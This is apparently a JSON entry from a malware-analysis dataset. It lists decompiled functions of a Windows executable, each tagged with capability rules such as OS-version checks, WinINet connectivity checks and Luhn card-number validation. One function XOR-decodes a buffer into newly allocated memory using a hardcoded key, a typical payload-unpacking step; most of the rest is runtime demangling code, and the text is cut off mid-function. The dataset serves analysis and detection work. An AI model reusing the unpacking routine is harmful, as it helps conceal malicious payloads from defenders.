{
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401180": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t fcn.00401180(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    char *pcVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    int64_t iVar14;\n    int64_t in_GS_OFFSET;\n    bool bVar15;\n    ulong auStack168 [7];\n    uint8_t uStack108;\n    uint16_t uStack104;\n    \n    puVar13 = auStack168;\n    for (iVar11 = 0xd; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    if (*0x434050 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack168);\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n    uVar10 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        bVar15 = *0x434ab8 == 0;\n        *0x434ab8 = *0x434ab8 ^ bVar15 * (*0x434ab8 ^ uVar10);\n        uVar3 = !bVar15 * *0x434ab8;\n        if (uVar3 == 0) break;\n        if (uVar10 == uVar3) {\n            bVar15 = true;\n            goto joined_r0x0040140e;\n        }\n        (*pcVar5)(1000);\n    }\n    bVar15 = false;\njoined_r0x0040140e:\n    if (*0x434ab0 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n    }\n    else if (*0x434ab0 == 0) {\n        *0x434ab0 = 1;\n        sub.msvcrt.dll__initterm(0x436018);\n    }\n    else {\n        *0x434004 = 1;\n    }\n    if (*0x434ab0 == 1) {\n        sub.msvcrt.dll__initterm(0x436000);\n        *0x434ab0 = 2;\n    }\n    if (!bVar15) {\n        *0x434ab8 = 0;\n    }\n    if (*0x42ed40 != NULL) {\n        (**0x42ed40)(0);\n    }\n    fcn.0040a440();\n    *0x4340a0 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x409e80);\n    fcn.00409d90();\n    func_0x00419ed8();\n    fcn.0040a760();\n    iVar4 = *0x434028;\n    *0x434a98 = 0x400000;\n    pcVar6 = *_sym.imp.msvcrt.dll__acmdln;\n    if (pcVar6 != NULL) {\n        bVar15 = false;\n        do {\n            cVar2 = *pcVar6;\n            if (cVar2 < '!') {\n                *0x434a90 = pcVar6;\n                if (cVar2 == '\\0') break;\n                if (!bVar15) goto code_r0x004012d4;\n                bVar15 = true;\n            }\n            else if (cVar2 == '\\\"') {\n                bVar15 = bVar15 ^ 1;\n            }\n            pcVar6 = pcVar6 + 1;\n        } while( true );\n    }\n    goto code_r0x004012e7;\n    while (*pcVar6 != '\\0') {\ncode_r0x004012d4:\n        pcVar6 = pcVar6 + 1;\n        *0x434a90 = pcVar6;\n        if (' ' < *pcVar6) break;\n    }\ncode_r0x004012e7:\n    if ((*0x434050 != 0) && (*0x416000 = 10,  (uStack108 & 1) != 0)) {\n        *0x416000 = uStack104;\n    }\n    iVar14 = (*0x434028 + 1) * 8;\n    iVar7 = sub.msvcrt.dll_malloc(iVar14);\n    iVar11 = *0x434020;\n    if (iVar4 < 1) {\n        iVar14 = 0;\n    }\n    else {\n        iVar12 = 0;\n        do {\n            iVar8 = sub.msvcrt.dll_strlen(*(iVar11 + iVar12 * 8));\n            uVar9 = sub.msvcrt.dll_malloc(iVar8 + 1);\n            *(iVar7 + iVar12 * 8) = uVar9;\n            iVar1 = iVar12 * 8;\n            iVar12 = iVar12 + 1;\n            sub.msvcrt.dll_memcpy(uVar9, *(iVar11 + iVar1), iVar8 + 1);\n        } while (iVar12 < iVar4);\n        iVar14 = iVar14 + -8;\n    }\n    *(iVar7 + iVar14) = 0;\n    *0x434020 = iVar7;\n    fcn.0040a810();\n    iVar4 = *0x434028;\n    *_sym.imp.msvcrt.dll___initenv = *0x434018;\n    uVar10 = fcn.00415350(iVar4, *0x434020);\n    *0x43400c = uVar10;\n    if (*0x434008 != 0) {\n        if (*0x434004 == 0) {\n            sub.msvcrt.dll__cexit();\n            uVar10 = *0x43400c;\n        }\n        return uVar10;\n    }\n    sub.msvcrt.dll_exit(uVar10 & 0xffffffff);\n    *0x434050 = 1;\n    fcn.0040a830();\n    uVar10 = fcn.00401180();\n    return uVar10;\n}\n",
        "token_count": 1354
    },
    "004014f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.004014f0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    iVar3 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"sc.exe\", 0);\n    if (iVar3 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"sc.exe\", 0);\n        if (iVar3 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"sc.exe\", 0);\n            if (iVar3 == 0) {\n                iVar3 = 0;\n            }\n            else {\n                iVar3 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"sc.exe\", 0);\n                if (iVar3 == 0) {\n                    iVar3 = 0;\n                }\n                else {\n                    (*_sym.imp.msvcrt.dll__wtoi)(0x42d038);\n                    uVar1 = (*_sym.imp.msvcrt.dll__wtoi)(L\"4096\");\n                    uVar2 = (*_sym.imp.msvcrt.dll__wtoi)(L\"8192\");\n                    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, arg2, uVar2 | uVar1);\n                    if (iVar3 == 0) {\n                        iVar3 = 0;\n                    }\n                    else {\n                        for (var_18h._4_4_ = 0; var_18h._4_4_ < arg2; var_18h._4_4_ = var_18h._4_4_ + 1) {\n                            *(var_18h._4_4_ + iVar3) =\n                                 \"387aKtAm2??Epd)LFt5x@i^d0*c$_81_49_%lRMm$\"[var_18h._4_4_ % 0x2a] ^\n                                 *(arg1 + var_18h._4_4_);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 575
    },
    "004018b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** fcn.004018b0(int64_t arg1, int32_t **arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint64_t arg2_00;\n    int32_t **ppiVar4;\n    \n    cVar3 = **(arg1 + 0x18);\n    ppiVar4 = arg2;\n    do {\n        if ((cVar3 == 'V') || (cVar3 == 'r')) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            if (cVar3 == 'r') {\n                *(arg1 + 0x50) = *(arg1 + 0x50) + 9;\n                arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1c;\n            }\n            else {\n                if (cVar3 != 'V') goto code_r0x004018e2;\n                *(arg1 + 0x50) = *(arg1 + 0x50) + 9;\n                arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1d;\n            }\n        }\n        else {\n            if (cVar3 != 'K') {\n                if (((arg3 == 0) && (cVar3 == 'F')) && (ppiVar4 != arg2)) {\n                    do {\n                        piVar2 = *arg2;\n                        iVar1 = *piVar2;\n                        if (iVar1 == 0x1a) {\n                            *piVar2 = 0x1d;\n                        }\n                        else if (iVar1 == 0x1b) {\n                            *piVar2 = 0x1e;\n                        }\n                        else if (iVar1 == 0x19) {\n                            *piVar2 = 0x1c;\n                        }\n                        arg2 = piVar2 + 2;\n                    } while (ppiVar4 != arg2);\n                }\n                return ppiVar4;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\ncode_r0x004018e2:\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 6;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1e;\n        }\n        piVar2 = fcn.004017e0(arg1, arg2_00, 0, 0);\n        *ppiVar4 = piVar2;\n        if (piVar2 == NULL) {\n            return NULL;\n        }\n        ppiVar4 = piVar2 + 2;\n        cVar3 = **(arg1 + 0x18);\n    } while( true );\n}\n",
        "token_count": 635
    },
    "00401b00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * fcn.00401b00(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int64_t iVar3;\n    char cVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    ulong uVar13;\n    \n    pcVar8 = *(arg1 + 0x18);\n    if (*pcVar8 != 'S') {\n        return NULL;\n    }\n    *(arg1 + 0x18) = pcVar8 + 1;\n    if (pcVar8[1] == '\\0') {\n        cVar4 = '\\0';\ncode_r0x00401b22:\n        uVar10 = *(arg1 + 0x10) >> 3 & 1;\n        if ((arg2 != 0) && (uVar10 == '\\0')) {\n            uVar10 = **(arg1 + 0x18) + 0xbdU < 2;\n        }\n        pcVar8 = 0x42df00;\n        do {\n            if (cVar4 == *pcVar8) {\n                iVar3 = *(pcVar8 + 0x28);\n                if (iVar3 == 0) {\n                    iVar11 = *(arg1 + 0x2c);\n                    iVar12 = *(arg1 + 0x28);\n                }\n                else {\n                    iVar12 = *(arg1 + 0x28);\n                    iVar11 = *(arg1 + 0x2c);\n                    uVar2 = *(pcVar8 + 0x30);\n                    puVar9 = NULL;\n                    if (iVar12 < iVar11) {\n                        iVar5 = iVar12;\n                        iVar12 = iVar12 + 1;\n                        *(arg1 + 0x28) = iVar12;\n                        puVar1 = *(arg1 + 0x20) + iVar5 * 0x18;\n                        if (puVar1 != NULL) {\n                            *puVar1 = 0x18;\n                            *(puVar1 + 2) = iVar3;\n                            puVar1[4] = uVar2;\n                            puVar9 = puVar1;\n                        }\n                    }\n                    *(arg1 + 0x48) = puVar9;\n                }\n                if (uVar10 == 0) {\n                    uVar13 = *(pcVar8 + 8);\n                    iVar7 = *(pcVar8 + 0x10);\n                }\n                else {\n                    uVar13 = *(pcVar8 + 0x18);\n                    iVar7 = *(pcVar8 + 0x20);\n                }\n                *(arg1 + 0x50) = *(arg1 + 0x50) + iVar7;\n                if (iVar11 <= iVar12) {\n                    return NULL;\n                }\n                *(arg1 + 0x28) = iVar12 + 1;\n                puVar9 = *(arg1 + 0x20) + iVar12 * 0x18;\n                if (puVar9 == NULL) {\n                    return NULL;\n                }\n                *puVar9 = 0x18;\n                *(puVar9 + 2) = uVar13;\n                puVar9[4] = iVar7;\n                return puVar9;\n            }\n            pcVar8 = pcVar8 + 0x38;\n        } while (pcVar8 != 0x42e088);\n    }\n    else {\n        *(arg1 + 0x18) = pcVar8 + 2;\n        cVar4 = pcVar8[1];\n        iVar12 = cVar4;\n        if ((cVar4 - 0x30U < 10) || (cVar4 == '_')) {\n            if (cVar4 != '_') goto code_r0x00401b81;\n            uVar10 = 0;\n        }\n        else {\n            if (0x19 < cVar4 + 0xbfU) goto code_r0x00401b22;\ncode_r0x00401b81:\n            uVar6 = 0;\n            do {\n                while( true ) {\n                    if (iVar12 - 0x30U < 10) {\n                        uVar10 = iVar12 + -0x30 + uVar6 * 0x24;\n                    }\n                    else {\n                        if (0x19 < iVar12 + 0xbfU) {\n                            return NULL;\n                        }\n                        uVar10 = iVar12 + -0x37 + uVar6 * 0x24;\n                    }\n                    if (uVar10 < uVar6) {\n                        return NULL;\n                    }\n                    pcVar8 = *(arg1 + 0x18);\n                    uVar6 = uVar10;\n                    if (*pcVar8 != '\\0') break;\n                    iVar12 = 0;\n                }\n                *(arg1 + 0x18) = pcVar8 + 1;\n                iVar12 = *pcVar8;\n            } while (*pcVar8 != '_');\n            uVar10 = uVar10 + 1;\n        }\n        if (uVar10 < *(arg1 + 0x38)) {\n            *(arg1 + 0x40) = *(arg1 + 0x40) + 1;\n            return *(*(arg1 + 0x30) + uVar10 * 8);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1197
    },
    "00402000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.00402000(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    \n    if (arg2 == 0) {\n        pcVar1 = *(arg1 + 0x18);\n        if (*pcVar1 == '\\0') {\n            return 0;\n        }\n        *(arg1 + 0x18) = pcVar1 + 1;\n        arg2._0_4_ = *pcVar1;\n    }\n    if (arg2 == 0x68) {\n        fcn.00401d60(arg1 + 0x18);\ncode_r0x00402069:\n        if (**(arg1 + 0x18) == '_') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return 1;\n        }\n        return 0;\n    }\n    if (arg2 == 0x76) {\n        fcn.00401d60(arg1 + 0x18);\n        if (**(arg1 + 0x18) == '_') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            fcn.00401d60(arg1 + 0x18);\n            goto code_r0x00402069;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 297
    },
    "00402080": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.00402080(int64_t arg1, int32_t *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(arg1 + 0x120);\n    if (piVar1 == NULL) {\n        *(arg1 + 0x130) = 1;\n        return piVar1;\n    }\n    iVar2 = *arg2;\n    piVar1 = *(*(piVar1 + 2) + 0x10);\n    if ((piVar1 == NULL) || (*piVar1 != 0x2f)) {\n        return NULL;\n    }\n    if (iVar2 < 1) {\n        if (iVar2 != 0) {\n            return NULL;\n        }\n    }\n    else {\n        do {\n            piVar1 = *(piVar1 + 4);\n            iVar2 = iVar2 + -1;\n            if (piVar1 == NULL) {\n                return piVar1;\n            }\n            if (*piVar1 != 0x2f) {\n                return NULL;\n            }\n        } while (iVar2 != 0);\n    }\n    return *(piVar1 + 2);\n}\n",
        "token_count": 262
    },
    "004023a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nulong fcn.004023a0(int64_t arg1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    char *pcVar5;\n    int64_t *piVar6;\n    int64_t iStack32;\n    \n    uVar3 = *(arg1 + 0x48);\n    pcVar2 = *(arg1 + 0x18);\n    if (1 < *pcVar2 + 0xb7U) {\n        return 0;\n    }\n    pcVar5 = pcVar2 + 1;\n    *(arg1 + 0x18) = pcVar5;\n    cVar1 = pcVar2[1];\n    if (cVar1 == 'E') {\n        *(arg1 + 0x18) = pcVar2 + 2;\n    // WARNING: Could not recover jumptable at 0x004017f7. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar3 = (*(*0x42d31c + 0x42d260))(arg1, 0x2f, 0, 0);\n        return uVar3;\n    }\n    iStack32 = 0;\n    piVar6 = &iStack32;\n    do {\n        if (cVar1 == 'L') {\n            iVar4 = fcn.00402240(arg1);\n        }\n        else if (cVar1 < 'M') {\n            if (1 < cVar1 + 0xb7U) goto code_r0x00402462;\n            iVar4 = fcn.004023a0(arg1);\n        }\n        else if (cVar1 == 'X') {\n            *(arg1 + 0x18) = pcVar5 + 1;\n            iVar4 = fcn.00404020(arg1);\n            if (**(arg1 + 0x18) != 'E') {\n                return 0;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n        }\n        else {\ncode_r0x00402462:\n            iVar4 = fcn.00402960(arg1);\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        iVar4 = fcn.004017e0(arg1, 0x2f, iVar4, 0);\n        *piVar6 = iVar4;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        pcVar5 = *(arg1 + 0x18);\n        piVar6 = iVar4 + 0x10;\n        cVar1 = *pcVar5;\n        if (cVar1 == 'E') {\n            *(arg1 + 0x48) = uVar3;\n            *(arg1 + 0x18) = pcVar5 + 1;\n            return iStack32;\n        }\n    } while( true );\n}\n",
        "token_count": 662
    },
    "00402960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00402960(int64_t arg1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    bool bVar4;\n    int32_t **ppiVar5;\n    int32_t *piVar6;\n    ulong uVar7;\n    uint16_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    char *arg2;\n    char *pcVar13;\n    int32_t *apiStack48 [2];\n    \n    pcVar2 = *(arg1 + 0x18);\n    cVar1 = *pcVar2;\n    if (((cVar1 == 'r') || (cVar1 == 'V')) || (cVar1 == 'K')) {\n        ppiVar5 = fcn.004018b0(arg1, apiStack48, 0);\n        if (ppiVar5 == NULL) {\n            return NULL;\n        }\n        piVar6 = fcn.00402960(arg1);\n        *ppiVar5 = piVar6;\n        if (piVar6 == NULL) {\n            return NULL;\n        }\n        if (*piVar6 - 0x1fU < 2) {\n            piVar3 = *(piVar6 + 2);\n            *(piVar6 + 2) = apiStack48[0];\n            apiStack48[0] = *ppiVar5;\n            *ppiVar5 = piVar3;\n        }\n        if (apiStack48[0] == NULL) {\n            return NULL;\n        }\n        iVar10 = *(arg1 + 0x38);\n        if (*(arg1 + 0x3c) <= iVar10) {\n            return NULL;\n        }\n        *(*(arg1 + 0x30) + iVar10 * 8) = apiStack48[0];\n        *(arg1 + 0x38) = iVar10 + 1;\n        return apiStack48[0];\n    }\n    uVar9 = cVar1 - 0x30;\n    if (0x4a < uVar9) {\n        return NULL;\n    }\n    // switch table (75 cases) at 0x42d534\n    switch(*((uVar9 & 0xff) * 4 + 0x42d534) + 0x42d534) {\n    case 0x4029e0:\n        goto code_r0x004029e0;\n    case 0x402a80:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00401f20(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x28, uVar7, 0);\n        break;\n    case 0x402ae4:\n        apiStack48[0] = fcn.004024c0(arg1);\n        break;\n    case 0x402af3:\n        arg2 = pcVar2 + 1;\n        *(arg1 + 0x18) = arg2;\n        if (pcVar2[1] == '_') {\n            iVar11 = 0;\n        }\n        else {\n            pcVar13 = arg2;\n            if (pcVar2[1] - 0x30U < 10) {\n                do {\n                    pcVar13 = pcVar13 + 1;\n                    *(arg1 + 0x18) = pcVar13;\n                } while (*pcVar13 - 0x30U < 10);\n                iVar11 = fcn.00401860(arg1, arg2, pcVar13 - arg2);\n                if (iVar11 == 0) goto code_r0x00402b48;\n            }\n            else {\n                iVar11 = fcn.00404020(arg1);\n                if (iVar11 == 0) {\n                    apiStack48[0] = NULL;\n                    break;\n                }\n            }\n            arg2 = *(arg1 + 0x18);\n            if (*arg2 != '_') goto code_r0x00402b48;\n        }\n        *(arg1 + 0x18) = arg2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x2a, iVar11, uVar7);\n        break;\n    case 0x402b50:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x25, uVar7, 0);\n        break;\n    case 0x402b80:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        if (pcVar2[1] == 'Y') {\n            *(arg1 + 0x18) = pcVar2 + 2;\n        }\n        uVar7 = fcn.004033c0(arg1, 1);\n        piVar6 = fcn.004019d0(arg1, uVar7);\n        apiStack48[0] = NULL;\n        if (**(arg1 + 0x18) == 'E') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            apiStack48[0] = piVar6;\n        }\n        break;\n    case 0x402bd0:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x26, uVar7, 0);\n        break;\n    case 0x402c00:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        if (pcVar2[1] == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar2 + 2;\n        if (0x30 < pcVar2[1] + 0xbaU) {\n            return NULL;\n        }\n    // switch table (49 cases) at 0x42d660\n        switch(*((pcVar2[1] + 0xbaU) * 4 + 0x42d660) + 0x42d660) {\n        case 0x40299a:\n            uVar7 = fcn.00404020(arg1);\n            apiStack48[0] = fcn.004017e0(arg1, 0x41, uVar7, 0);\n            if (apiStack48[0] == NULL) {\n                return NULL;\n            }\n            pcVar2 = *(arg1 + 0x18);\n            if (*pcVar2 == '\\0') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = pcVar2 + 1;\n            if (*pcVar2 != 'E') {\n                return NULL;\n            }\n            goto code_r0x00402ab9;\n        case 0x4029e0:\n            goto code_r0x004029e0;\n        case 0x402e9e:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ed00;\n                    iVar11 = 0x42ed00;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x402eeb:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ecc0;\n                    iVar11 = 0x42ecc0;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x402f2b:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ec60;\n                    iVar11 = 0x42ec60;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x402f6e:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42eca0;\n                    iVar11 = 0x42eca0;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x402fb1:\n            if (pcVar2[2] == '_') {\n                *(arg1 + 0x18) = pcVar2 + 3;\n                iVar11 = fcn.00404020(arg1);\n            }\n            else {\n                iVar11 = fcn.00401dd0(arg1);\n            }\n            if (iVar11 == 0) goto code_r0x00402b48;\n            apiStack48[0] = NULL;\n            if (**(arg1 + 0x18) == '_') {\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                uVar7 = fcn.00402960(arg1);\n                apiStack48[0] = fcn.004017e0(arg1, 0x2d, iVar11, uVar7);\n            }\n            goto code_r0x00402ab0;\n        case 0x403006:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ece0;\n                    iVar11 = 0x42ece0;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x403049:\n            uVar7 = fcn.00402960(arg1);\n            apiStack48[0] = fcn.004017e0(arg1, 0x49, uVar7, 0);\n            goto code_r0x00402ab0;\n        case 0x403069:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ed20;\n                    iVar11 = 0x42ed20;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x4030ac:\n            iVar10 = *(arg1 + 0x28);\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n                iVar11 = *0x8;\n                if (piVar6 != NULL) {\n                    *piVar6 = 0x27;\n                    *(piVar6 + 2) = 0x42ec80;\n                    iVar11 = 0x42ec80;\n                }\n                goto code_r0x00402ee0;\n            }\n            break;\n        case 0x4030ef:\n            piVar6 = fcn.00401860(arg1, \"auto\", 4);\n            return piVar6;\n        case 0x403109:\n            iVar10 = *(arg1 + 0x28);\n            apiStack48[0] = NULL;\n            if (iVar10 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar10 + 1;\n                apiStack48[0] = *(arg1 + 0x20) + iVar10 * 0x18;\n            }\n            *apiStack48[0] = 0x2c;\n            bVar4 = pcVar2[2] - 0x30U < 10;\n            *(apiStack48[0] + 4) = bVar4;\n            if (bVar4) {\n                fcn.00401d60(arg1 + 0x18);\n            }\n            piVar6 = apiStack48[0];\n            uVar7 = fcn.00402960(arg1);\n            *(piVar6 + 2) = uVar7;\n            if (*(apiStack48[0] + 2) == 0) {\n                return NULL;\n            }\n            fcn.00401d60(arg1 + 0x18);\n            pcVar2 = *(arg1 + 0x18);\n            uVar8 = 0;\n            if (*pcVar2 != '\\0') {\n                *(arg1 + 0x18) = pcVar2 + 1;\n                uVar8 = *pcVar2 == 's';\n            }\n            *(apiStack48[0] + 0x12) = uVar8;\n            return apiStack48[0];\n        }\n        piVar6 = NULL;\n        iVar11 = *0x8;\ncode_r0x00402ee0:\n        *(arg1 + 0x50) = *(arg1 + 0x50) + *(iVar11 + 8);\n        return piVar6;\n    case 0x402c40:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        ppiVar5 = fcn.004018b0(arg1, apiStack48, 1);\n        if (ppiVar5 != NULL) {\n            piVar6 = fcn.00402960(arg1);\n            *ppiVar5 = piVar6;\n            if (piVar6 != NULL) {\n                if (ppiVar5 != apiStack48) {\n                    iVar10 = *piVar6;\n                    if (iVar10 - 0x1fU < 2) {\n                        piVar3 = *(piVar6 + 2);\n                        *(piVar6 + 2) = apiStack48[0];\n                        apiStack48[0] = *ppiVar5;\n                        *ppiVar5 = piVar3;\n                        iVar10 = *piVar3;\n                    }\n                    if (iVar10 != 0x29) {\n                        if ((apiStack48[0] == NULL) || (iVar10 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar10))\n                        goto code_r0x00402b48;\n                        *(*(arg1 + 0x30) + iVar10 * 8) = apiStack48[0];\n                        *(arg1 + 0x38) = iVar10 + 1;\n                    }\n                }\n                apiStack48[0] = fcn.004017e0(arg1, 0x2b, uVar7, apiStack48[0]);\n                break;\n            }\n        }\ncode_r0x00402b48:\n        apiStack48[0] = NULL;\n        break;\n    case 0x402cf0:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x24, uVar7, 0);\n        break;\n    case 0x402d20:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x22, 